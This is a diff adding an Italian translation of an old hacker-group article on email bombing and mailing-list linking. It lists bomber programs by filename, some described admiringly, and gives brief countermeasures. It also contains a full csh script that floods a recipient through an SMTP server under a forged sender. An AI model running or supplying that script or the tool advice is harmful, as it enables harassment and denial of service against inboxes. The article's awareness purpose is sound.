@@ -1,0 +1,181 @@
+=======================
+Mail bombing e list linking
+=======================
+di Tolda[2000][
+Con commenti e aggiunte di Raven.
+Tradotto dal M3xican
+Scritto per BSRF
+Homepage: http://blacksun.box.sk
+
+Nota importante
+===============
+L'autore di questo articolo e BSFR credono che il mail bombing e il list linking sono contro la legge, 
+e non dovrebbero nemmeno essere effettuate nè effettuate da nessuno. In fatti, questi sono due delle più stupide 
+cose che puoi fare sul net, e rendono soltanto te finto. Tali attacchi sono solo effettuati da bambini con troppo 
+tempo nelle loro mani, che non sono abbastanza intelligenti per effettuare attacchi più sofisticati.
+
+Conosci il tuo nemico 
+===================
+
+Se questi files appaiono in un directory di un utente, probabilità che starà per bombardare qualcuno (naturalmente, 
+forse egli semplicemente spende il suo tempo collezionando programmi sull’hacking e il cracking). In ogni caso, 
+l’utilità è difficile da trovare. Se uno dei tuoi utenti si è procurato questo programma, egli chiaramente ha 
+interessi nell’hacking o nel cracking  :o)
+
+- Up Yours:
+
+Il programma Up Yours per il mail-bombing è probabilmente il più popolare bomber in rete. Usa risorse minime, fa 
+un lavoro superbo, ha una semplice interfaccia utente, e tenta di oscurare l'indirizzo sorgente dell'aggressore. 
+Caratteristiche del programma incluse sono la possibilità di specificare le volte del giorno in cui inizire e 
+fermarsi così come il numero di messaggi con i quali sarà martellato il bersaglio.
+
+Questo bomber può essere eseguito solo su una piattaforma windows. Se sei un amministratore di sistema, vorrai 
+ricercare sui tuoi drives locali i file seguenti:
+
+upyours.exe
+upyours2.zip
+upyours3.zip
+
+
+- KaBoom:
+
+KaBoom differisce significativamente da Up Yours. Nel programma principale, tu trovi un utility di link list. 
+Usando questa funzione, puoi sottoscrivere il tuo bersaglio a centinaia di mailing list. Quando io dico che il 
+bersaglio è stato linkato alla lista, intendo che il bersaglio è stato sottoscritto (senza il suo consenso) a una 
+o più mailing list. Tali strumenti sottomettono la richiesta di registrazione a nome della vittima, falsificando 
+il suo indirizzo e-mail. In ogni caso, i files che includono questa utilità sono:
+
+kaboom!3.zip
+kaboom3.exe
+
+
+- Avalanche
+
+L’utility per il  mail bombing avalanche lavora scorrevolmente ed è ben progettato. I list group sono mostrati 
+in un box combinato drop-down, e le loro liste individuali sono mostrate in un box di liste. Tre click di un mouse 
+e il tuo bersaglio è in acque calde.
+
+CONSIGLIO: Il programmatore qui è stato un po’ irragionevole. Il programma è stato scritto almeno in parte in 
+visual basic 4.0. E come tale, ci sono una serie di files DLL che sono richiesti per eseguire l’applicazione. 
+Questi sono mancati nella distribuzione generale di questa utilità; quindi, bombers seri devono uscire su internet 
+per recuperare questi files (uno è OC2.DLL). A causa di ciò, io prevedo che avalanche è probabilmente usato meno 
+dei suoi corrispettivi, anche se il suo progetto generale è superiore. Le scomodità scoraggiano la maggior parte 
+degli utenti di questo particolare genere. I files per questo prodotto sono:
+
+alanch10.zip
+avalanche20.zip
+avalanche.exe
+
+
+- Unabomber
+
+L’utility  unabomber è un attrezzo rudimentale, ma bisogna dare credito all’autore per il senso dell’umorismo. 
+Una bomber non offre capacità di list linking. E’ essenzialmente un semplice e-mail bomber e non fa altro che 
+mandare messaggi più volte. Uno degli elementi interessanti è che una bomber ha una funzione di help. I files 
+per questa utility sono: 
+
+unabomb.zip
+unabomb.exe
+
+
+- eXtreme Mail:
+
+eXtreme Mail è ben programmato. Include un processo interattivo di installazione che effettua tutti i controlli 
+di routine per lo spazio su disco, risorse, a così via. Osserva anche le adatte convenzioni del registry e è 
+facilmente disinstallabile. I files per questo prodotto sono:
+
+xmailb1.zip
+xmailb1.exe
+
+
+- Homicide
+
+L’utility omicide è stata scritta da un ragazzo col moniker Frys ed è stata interrotta nel 1996. L’autore 
+afferma che ha scritto l’utility perché Up Yours 2.0 è inadeguato come strumento per il mail-bombing. Comunque 
+con il rilascio di Up Yours 3.0, Frys apparentemente decise di cessare ulteriori distribuzioni. Da Marzo 1997, 
+è disponibile solo su veramente pochi siti selezionati. I files per questa utilità sono:
+
+omicide.zip
+omicide.exe
+
+
+- Mail bomb con UNIX
+
+Questo mail bomber per UNIX è stato scritto, a quel che si dice, da CyberGoat, un anonimo cracker. Il file 
+seguente è mailbomb.csh. E’ infatti un CSH shell script e non un programma, poiché unix ha tali potenti shells 
+e capacità di shell scripting. E’ un grande vantaggio che sia molto piccolo nelle dimensioni.
+
+
+#!/bin/csh
+ # Anonymous Mailbomber
+ # do chmod u+rwx <filename> where filename is the name of the file 
+ that
+ # you saved it as.
+ #*** WARNING - THIS WILL CREATE AND DELETE A TEMP FILE CALLED
+ # "teltemp"
+ # IN THE DIRECTORY IT IS RUN FROM ****
+ clear
+ echo -n "What is the name or address of the smtp server ?"
+ set server = $<
+ #echo open $server 25 > teltemp
+ echo quote helo somewhere.com >> teltemp
+ #The entry for the following should be a single name (goober),
+ #not goober@internet.address <mailto:goober@internet.address>.
+ echo -n "Who will this be from (e.g. somebody) ?"
+ set from = $<
+ echo quote mail from: $from >> teltemp
+ echo -n "Who is the lucky recipient (e.g. someone@somewhere) ? "
+ set name = $<
+ echo quote rcpt to: $name >> teltemp
+ echo quote data >> teltemp
+ echo quote . >> teltemp
+ echo quote quit >> teltemp
+ echo quit >> teltemp
+ echo -n "How many times should it be sent ?"
+ set amount = $<
+ set loop_count = 1
+ while ($loop_count <= $amount)
+ echo "Done $loop_count"
+ ftp -n $server 25 < teltemp
+ @ loop_count++
+ end
+ rm ./teltemp
+ echo $amount e-mails complete to $name from $from@$server
+ # --------------------
+ # MailBomb by CyBerGoAT
+
+
+- Bombtrack:
+
+L’utility bombtrack è, a quel che si dice, il primo strumento per il mail  bombino scritto per la piattaforma 
+macintosh.. E’ un altro comune utilità per il mail bombino, largamente disponibile sui siti crackers su internet. 
+Il file di questa applicazione è:
+
+bombtrack.bin
+
+
+- FlameThrower:
+
+FlameThrower è un utility per il mail bombing scritta per macintosh. Il suo scopo principale è il list linking; 
+permette all’utente di sottoscrivere il bersaglio a 100 liste. Il binario è abbastanza ampio, considerando il 
+suo scopo designato. Il file per questo programma è:
+
+flmethrower10b.sit.bin 
+
+
+Contro misure per il mail bombing
+==============================
+Ci sono molte utilità là fuori (come pop3free, pop3clean, ecc..) che ripuliscono accounts di posta POP3. Per 
+imparare di più sul POP3, consulta al tutorial sul POP3 di BSRF. Così per gli account di posta basati sul web, 
+tu puoi sempre salvare ogni email reale che hai e cancellare il resto (ogni account email basato sul web dovrebbe 
+avere tale caratteristica). Per denunciare tale attacco, manda un messaggio al tuo team per gli abusi (per esempio: 
+se hai un acount su hotmail.com manda la tua email a abuse@hotmail.com).
+
+Per il list linking, se sei di fronte a un ampio attacco e non puoi cancellarti da tutte le mailig list da solo, 
+considera di dover cambiare account. Spiacente, non ci sono altri modi.
+
+
+
+=======================================================================      
+Questa guida è stata dal M3xican ( m3xican@napolihak.cjb.net ), se considerate la traduzione scadente o vi volete 
+cimentare nell’impresa potete scaricare la versione originale in americano sempre su <http://napolihak.cjb.net>.
